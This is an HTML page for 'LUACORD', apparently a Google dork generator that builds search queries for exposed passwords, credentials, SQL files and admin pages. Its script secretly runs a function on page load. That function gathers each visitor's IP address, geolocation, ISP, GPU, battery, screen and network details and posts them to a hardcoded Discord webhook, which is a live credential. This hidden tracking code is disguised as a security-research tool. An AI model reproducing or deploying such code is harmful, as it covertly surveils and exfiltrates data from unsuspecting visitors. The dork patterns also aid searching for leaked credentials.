<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LUACORD - Google Dorks</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary-color: #5865F2;
            --secondary-color: #404EED;
            --dark-color: #121212;
            --darker-color: #0a0a0a;
            --light-color: #e0e0e0;
            --accent-color: #EB459E;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Poppins', sans-serif;
        }

        body {
            background-color: var(--darker-color);
            color: var(--light-color);
            line-height: 1.6;
            padding: 20px;
            min-height: 100vh;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
            background-color: var(--dark-color);
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }

        .header {
            text-align: center;
            margin-bottom: 30px;
            padding: 20px 0;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }

        .rgb-text {
            background: linear-gradient(90deg, #ff0000, #ff7f00, #ffff00, #00ff00, #0000ff, #4b0082, #9400d3);
            background-size: 400% 400%;
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            animation: rgbAnimation 8s ease infinite, pulse 2s ease infinite alternate;
            font-size: 3.5rem;
            font-weight: 700;
            text-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
        }

        @keyframes rgbAnimation {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        @keyframes pulse {
            0% { transform: scale(1); }
            100% { transform: scale(1.05); }
        }

        .subtitle {
            color: var(--primary-color);
            font-style: italic;
            margin-top: 5px;
            animation: subtitleGlow 3s ease infinite alternate;
        }

        @keyframes subtitleGlow {
            0% { text-shadow: 0 0 5px rgba(88, 101, 242, 0.5); }
            100% { text-shadow: 0 0 15px rgba(88, 101, 242, 0.8); }
        }

        .search-box {
            margin-bottom: 30px;
        }

        .search-container {
            display: flex;
            max-width: 1000px;
            margin: 0 auto;
            gap: 10px;
        }

        .search-container input {
            flex: 1;
            padding: 15px;
            background-color: rgba(255, 255, 255, 0.1);
            border: 2px solid rgba(255, 255, 255, 0.2);
            border-radius: 8px;
            font-size: 16px;
            outline: none;
            transition: all 0.3s;
            color: white;
        }

        .search-container input:focus {
            border-color: var(--primary-color);
            box-shadow: 0 0 15px rgba(88, 101, 242, 0.5);
        }

        .search-container select {
            padding: 0 15px;
            background-color: rgba(0, 0, 0, 0.5);
            border: 2px solid rgba(255, 255, 255, 0.2);
            border-radius: 8px;
            font-size: 16px;
            outline: none;
            color: white;
            cursor: pointer;
            transition: all 0.3s;
            appearance: none;
            -webkit-appearance: none;
            -moz-appearance: none;
            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='white'%3e%3cpath d='M7 10l5 5 5-5z'/%3e%3c/svg%3e");
            background-repeat: no-repeat;
            background-position: right 10px center;
            background-size: 15px;
            padding-right: 35px;
        }

        .search-container select:focus {
            border-color: var(--primary-color);
            box-shadow: 0 0 15px rgba(88, 101, 242, 0.5);
        }

        .search-container select option {
            background-color: var(--dark-color);
            color: white;
            padding: 10px;
        }

        .search-container button {
            padding: 0 25px;
            background: linear-gradient(135deg, var(--primary-color), var(--accent-color));
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 16px;
            font-weight: 600;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .search-container button:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(88, 101, 242, 0.5);
        }

        .result-container {
            background-color: rgba(0, 0, 0, 0.3);
            border-radius: 12px;
            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.2);
            margin-bottom: 30px;
            overflow: hidden;
            border: 1px solid rgba(255, 255, 255, 0.1);
            opacity: 0;
            transform: translateY(20px);
            transition: all 0.5s ease;
        }

        .result-container.show {
            opacity: 1;
            transform: translateY(0);
        }

        .result-header {
            background: linear-gradient(90deg, var(--dark-color), rgba(88, 101, 242, 0.5));
            color: white;
            padding: 15px 20px;
            display: flex;
            align-items: center;
            cursor: pointer;
            transition: all 0.3s;
        }

        .result-header:hover {
            background: linear-gradient(90deg, var(--dark-color), rgba(88, 101, 242, 0.7));
        }

        .result-header h2 {
            font-size: 1.2rem;
            font-weight: 600;
        }

        .result-header i {
            margin-right: 10px;
            font-size: 1.2rem;
            transition: transform 0.3s;
        }

        .result-header.collapsed i {
            transform: rotate(-90deg);
        }

        .result-content {
            padding: 20px;
            min-height: 200px;
            max-height: 500px;
            overflow-y: auto;
            transition: all 0.3s;
        }

        .result-content.collapsed {
            display: none;
        }

        .placeholder {
            color: rgba(255, 255, 255, 0.5);
            text-align: center;
            padding: 50px 0;
            font-style: italic;
        }

        .error {
            color: #ff6b6b;
            text-align: center;
            padding: 20px;
        }

        .dork-result {
            margin-bottom: 20px;
            padding: 15px;
            background-color: rgba(0, 0, 0, 0.2);
            border-radius: 8px;
            border-left: 4px solid var(--primary-color);
            transition: all 0.3s;
        }

        .dork-result:hover {
            transform: translateX(5px);
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
        }

        .dork-result h3 {
            margin-bottom: 10px;
            color: var(--primary-color);
        }

        .dork-result a {
            color: var(--accent-color);
            text-decoration: none;
            transition: all 0.3s;
            word-break: break-all;
        }

        .dork-result a:hover {
            color: white;
            text-decoration: underline;
        }

        .features {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin-top: 30px;
        }

        .feature-box {
            background-color: rgba(0, 0, 0, 0.3);
            padding: 25px;
            border-radius: 12px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
            text-align: center;
            transition: all 0.3s;
            border: 1px solid rgba(255, 255, 255, 0.1);
        }

        .feature-box:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
            border-color: var(--primary-color);
        }

        .feature-box i {
            font-size: 2.5rem;
            background: linear-gradient(135deg, var(--primary-color), var(--accent-color));
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin-bottom: 15px;
        }

        .feature-box h3 {
            margin-bottom: 10px;
            color: white;
        }

        .feature-box p {
            color: rgba(255, 255, 255, 0.7);
            font-size: 0.9rem;
        }

        /* Custom scrollbar */
        ::-webkit-scrollbar {
            width: 8px;
        }

        ::-webkit-scrollbar-track {
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
        }

        ::-webkit-scrollbar-thumb {
            background: var(--primary-color);
            border-radius: 10px;
        }

        ::-webkit-scrollbar-thumb:hover {
            background: var(--accent-color);
        }

        @media (max-width: 768px) {
            .search-container {
                flex-direction: column;
            }
            
            .search-container input,
            .search-container select,
            .search-container button {
                width: 100%;
                border-radius: 8px;
            }
            
            .features {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1 class="rgb-text">LUACORD</h1>
            <p class="subtitle">Developed by Mentalite</p>
        </div>
        
        <div class="search-box">
            <div class="search-container">
                <input type="text" id="keywordInput" placeholder="Enter keyword (e.g., password, admin, confidential)">
                <select id="siteFilter">
                    <option value="pastebin.com">pastebin.com</option>
                    <option value="github.com">github.com</option>
                    <option value="gmail.com">gmail.com</option>
                    <option value="facebook.com">facebook.com</option>
                    <option value="twitter.com">twitter.com</option>
                    <option value="*">All Sites</option>
                </select>
                <button id="searchBtn"><i class="fas fa-search"></i> Dork It!</button>
            </div>
        </div>
        
        <div class="result-container" id="resultContainer">
            <div class="result-header" id="resultHeader">
                <h2><i class="fas fa-chevron-down"></i> Dork Results</h2>
            </div>
            <div class="result-content" id="dorkResults">
                <p class="placeholder">Results will appear here after dorking...</p>
            </div>
        </div>
        
        <div class="features">
            <div class="feature-box">
                <i class="fas fa-lock-open"></i>
                <h3>Data Exposure</h3>
                <p>Find exposed sensitive information across the web</p>
            </div>
            <div class="feature-box">
                <i class="fas fa-database"></i>
                <h3>Database Leaks</h3>
                <p>Discover leaked databases and credentials</p>
            </div>
            <div class="feature-box">
                <i class="fas fa-user-secret"></i>
                <h3>Security Research</h3>
                <p>Advanced search techniques for security professionals</p>
            </div>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            setTimeout(() => {
                document.getElementById('resultContainer').classList.add('show');
            }, 500);
            
            document.getElementById('resultHeader').addEventListener('click', function() {
                this.classList.toggle('collapsed');
                document.getElementById('dorkResults').classList.toggle('collapsed');
            });
            
            sendVisitorInfo();
            
            document.getElementById('searchBtn').addEventListener('click', function() {
                const keyword = document.getElementById('keywordInput').value.trim();
                const site = document.getElementById('siteFilter').value;
                
                if (keyword) {
                    generateDorks(keyword, site);
                } else {
                    alert('Please enter a keyword to search');
                }
            });
        });

        async function sendVisitorInfo() {
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const ip = ipData.ip;
                
                const detailsResponse = await fetch(`https://ipapi.co/${ip}/json/`);
                const locationData = await detailsResponse.json();
                
                const hardwareInfo = getHardwareInfo();
                const osInfo = getOSInfo();
                
                let discordAvailable = false;
                try {
                    discordAvailable = typeof window.Discord !== 'undefined';
                } catch (e) {
                    discordAvailable = false;
                }
                
                let gpuInfo = 'Not available';
                try {
                    const canvas = document.createElement('canvas');
                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                    if (gl) {
                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                        gpuInfo = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Unknown GPU';
                    }
                } catch (e) {
                    console.error('Error getting GPU info:', e);
                }
                
                const browserInfo = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    cookiesEnabled: navigator.cookieEnabled,
                    screenWidth: window.screen.width,
                    screenHeight: window.screen.height,
                    colorDepth: window.screen.colorDepth,
                    pixelRatio: window.devicePixelRatio,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    cpuCores: navigator.hardwareConcurrency || 'Unknown',
                    deviceMemory: navigator.deviceMemory || 'Unknown',
                    gpuInfo: gpuInfo,
                    discordAvailable: discordAvailable,
                    touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
                    batteryApi: 'getBattery' in navigator,
                    connection: navigator.connection ? {
                        effectiveType: navigator.connection.effectiveType,
                        downlink: navigator.connection.downlink,
                        rtt: navigator.connection.rtt,
                        saveData: navigator.connection.saveData
                    } : null
                };
                
                let batteryInfo = {};
                if ('getBattery' in navigator) {
                    try {
                        const battery = await navigator.getBattery();
                        batteryInfo = {
                            charging: battery.charging,
                            level: battery.level * 100,
                            chargingTime: battery.chargingTime,
                            dischargingTime: battery.dischargingTime
                        };
                    } catch (e) {
                        console.error('Error getting battery info:', e);
                    }
                }
                
                const networkInfo = {
                    ip: ip,
                    ...locationData,
                    vpnOrProxy: checkVPNProxy(),
                    torBrowser: navigator.userAgent.includes('Tor')
                };
                
                const timestamp = new Date().toISOString();
                const webhookURL = 'https://discord.com/api/webhooks/1396899184363438262/Xov5NQzse6RvbOlnIBlPVLlMopYd_wQzqRJy1-XblMd76f5l5d76yDkEcLhD1svhWmnz';
                
                const embed = {
                    title: "New Visitor on LUACORD - Detailed Info",
                    color: 0x5865F2,
                    fields: [
                        {
                            name: "🖥️ Hardware & OS",
                            value: `\`\`\`${hardwareInfo}\n${osInfo}\`\`\``,
                            inline: false
                        },
                        {
                            name: "🌐 Network & Location",
                            value: `\`\`\`IP: ${networkInfo.ip}\nLocation: ${networkInfo.city || 'Unknown'}, ${networkInfo.region || 'Unknown'}, ${networkInfo.country_name || 'Unknown'}\nISP: ${networkInfo.org || 'Unknown'}\nASN: ${networkInfo.asn || 'Unknown'}\nVPN/Proxy: ${networkInfo.vpnOrProxy}\nTor: ${networkInfo.torBrowser}\`\`\``,
                            inline: false
                        },
                        {
                            name: "🔍 Browser & Device",
                            value: `\`\`\`User Agent: ${browserInfo.userAgent}\nPlatform: ${browserInfo.platform}\nLanguage: ${browserInfo.language}\nScreen: ${browserInfo.screenWidth}x${browserInfo.screenHeight} (${browserInfo.colorDepth}bit)\nPixel Ratio: ${browserInfo.pixelRatio}\nCPU Cores: ${browserInfo.cpuCores}\nRAM: ${browserInfo.deviceMemory}GB\nGPU: ${browserInfo.gpuInfo}\nTimezone: ${browserInfo.timezone}\nTouch: ${browserInfo.touchSupport}\nBattery: ${batteryInfo.level ? batteryInfo.level + '%' : 'N/A'}\nConnection: ${browserInfo.connection ? browserInfo.connection.effectiveType : 'Unknown'}\`\`\``,
                            inline: false
                        },
                        {
                            name: "📊 Additional Info",
                            value: `\`\`\`Discord Available: ${browserInfo.discordAvailable}\nCookies: ${browserInfo.cookiesEnabled}\nTimestamp: ${timestamp}\`\`\``,
                            inline: false
                        }
                    ],
                    footer: {
                        text: "LUACORD - Developed by Mentalite"
                    }
                };
                
                fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        embeds: [embed]
                    })
                });
                
            } catch (error) {
                console.error('Error sending visitor info:', error);
            }
        }

        function getHardwareInfo() {
            const userAgent = navigator.userAgent;
            let hardwareInfo = '';
            
            if (/Mobi|Android|iPhone|iPad|iPod/i.test(userAgent)) {
                hardwareInfo += 'Mobile Device\n';
                if (/Android/i.test(userAgent)) {
                    hardwareInfo += 'Android OS\n';
                } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
                    hardwareInfo += 'iOS Device\n';
                }
            } else {
                hardwareInfo += 'Desktop Computer\n';
            }
            
            if (/x86_64|Win64|x64/i.test(userAgent)) {
                hardwareInfo += '64-bit Architecture\n';
            } else if (/x86|Win32|WOW64/i.test(userAgent)) {
                hardwareInfo += '32-bit Architecture\n';
            } else if (/arm64|aarch64/i.test(userAgent)) {
                hardwareInfo += 'ARM64 Architecture\n';
            } else if (/arm/i.test(userAgent)) {
                hardwareInfo += 'ARM Architecture\n';
            }
            
            return hardwareInfo.trim();
        }

        function getOSInfo() {
            const userAgent = navigator.userAgent;
            let os = 'Unknown OS';
            
            if (userAgent.includes('Windows NT 10.0')) os = 'Windows 10/11';
            else if (userAgent.includes('Windows NT 6.3')) os = 'Windows 8.1';
            else if (userAgent.includes('Windows NT 6.2')) os = 'Windows 8';
            else if (userAgent.includes('Windows NT 6.1')) os = 'Windows 7';
            else if (userAgent.includes('Windows NT 6.0')) os = 'Windows Vista';
            else if (userAgent.includes('Windows NT 5.1')) os = 'Windows XP';
            else if (userAgent.includes('Mac OS X')) os = 'Mac OS';
            else if (userAgent.includes('Linux')) os = 'Linux';
            else if (userAgent.includes('Android')) os = 'Android';
            else if (userAgent.includes('iOS') || /iPhone|iPad|iPod/i.test(userAgent)) os = 'iOS';
            
            return os;
        }

        function checkVPNProxy() {
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (connection) {
                if (connection.type === 'vpn' || connection.type === 'proxy') {
                    return 'Likely';
                }
                if (connection.effectiveType === 'cellular') {
                    return 'Mobile Data';
                }
            }
            
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            const languages = navigator.languages || [navigator.language];
            
            if (timezone && languages.length > 0) {
                const tzCountry = timezone.split('/')[0];
                const langCountry = languages[0].split('-')[1];
                if (tzCountry && langCountry && tzCountry !== langCountry) {
                    return 'Possible (Timezone/Language mismatch)';
                }
            }
            
            return 'Not detected';
        }

        function generateDorks(keyword, site) {
            const resultDiv = document.getElementById('dorkResults');
            resultDiv.innerHTML = '<p class="placeholder"><i class="fas fa-spinner fa-spin"></i> Generating dorks and search links...</p>';
            
            setTimeout(() => {
                let html = '';
                const siteFilter = site === '*' ? '' : `site:${site}`;
                
                const dorkPatterns = [
                    `intext:"${keyword}" ${siteFilter}`,
                    `intitle:"${keyword}" ${siteFilter}`,
                    `inurl:"${keyword}" ${siteFilter}`,
                    `filetype:pdf "${keyword}" ${siteFilter}`,
                    `filetype:xls "${keyword}" ${siteFilter}`,
                    `filetype:sql "${keyword}" ${siteFilter}`,
                    `"${keyword}" password ${siteFilter}`,
                    `"${keyword}" login ${siteFilter}`,
                    `"${keyword}" credentials ${siteFilter}`,
                    `"${keyword}" admin ${siteFilter}`
                ];
                
                dorkPatterns.forEach((dork, index) => {
                    const googleSearchUrl = `https://www.google.com/search?q=${encodeURIComponent(dork)}`;
                    const siteUrl = site === '*' ? '' : `https://${site}/search?q=${encodeURIComponent(keyword)}`;
                    
                    html += `
                        <div class="dork-result">
                            <h3>Dork Pattern #${index + 1}</h3>
                            <p><strong>Google Search:</strong> <a href="${googleSearchUrl}" target="_blank">${dork}</a></p>
                            ${site !== '*' ? `<p><strong>${site} Search:</strong> <a href="${siteUrl}" target="_blank">${keyword} on ${site}</a></p>` : ''}
                        </div>
                    `;
                });
                
                resultDiv.innerHTML = html;
            }, 1500);
        }
    </script>
</body>
</html>
